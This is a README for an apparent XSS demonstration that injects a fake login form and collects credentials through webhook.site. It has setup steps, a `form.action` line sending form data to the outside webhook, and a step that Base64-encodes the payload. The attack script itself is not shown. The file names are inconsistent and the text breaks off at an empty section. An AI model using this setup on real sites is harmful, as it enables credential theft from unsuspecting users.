# Overview
This project demonstrates a Cross-Site Scripting (XSS) vulnerability exploit using webhook data collection. The demonstration shows how malicious scripts can collect user credentials through a fake login form injection.

# Scripts Structure
xss-attack/
├── xss-webhooks-form.js  
├── webhook-data-collector.html   
└── readme.md        


# Steps
## 1. Setting Up the Webhook
```bash
    Visit https://webhook.site in your browser
    Your unique webhook URL will be generated automatically
    Keep this browser tab open to monitor incoming data
    Copy your webhook URL - you'll need it in the next step
```

## 2. Configuring the Attack Script
```bash
    Open webhook-form.js in your text editor
    Replace 'YOUR_WEBHOOK_URL' with your webhook.site URL:
    javascriptCopyform.action = 'https://webhook.site/your-unique-id';

    Save the changes
```

## 3. Setting Up the Data Collector
```bash
    Open data-collector.html in your text editor
    Find the WebSocket URL in your webhook.site dashboard
    Replace 'YOUR_WEBHOOK_WEBSOCKET_URL' with your WebSocket URL:
    javascriptCopyconst ws = new WebSocket('your-websocket-url');

    Save the changes
```

## 4. Executing the Demonstration
```bash
    Open your browser's developer console (F12 or Ctrl+Shift+I)
    Copy the entire content of webhook-form.js
    Paste it into the console and press Enter
    The script will output a Base64 encoded version
    Copy the Base64 encoded string
```

## 5. Monitoring Results
```bash
    Keep webhook.site open in a separate tab
    Watch for incoming POST requests
    Each request will contain form submission data
    Data appears in both webhook.site and your collector page

    Understanding the Components
    Webhook Form Script (webhook-form.js)
    This script creates a convincing fake login form that:

    Appears legitimate to users
    Captures entered credentials
    Posts data to your webhook endpoint
    Replaces the entire page content

    Data Collector (data-collector.html)
```
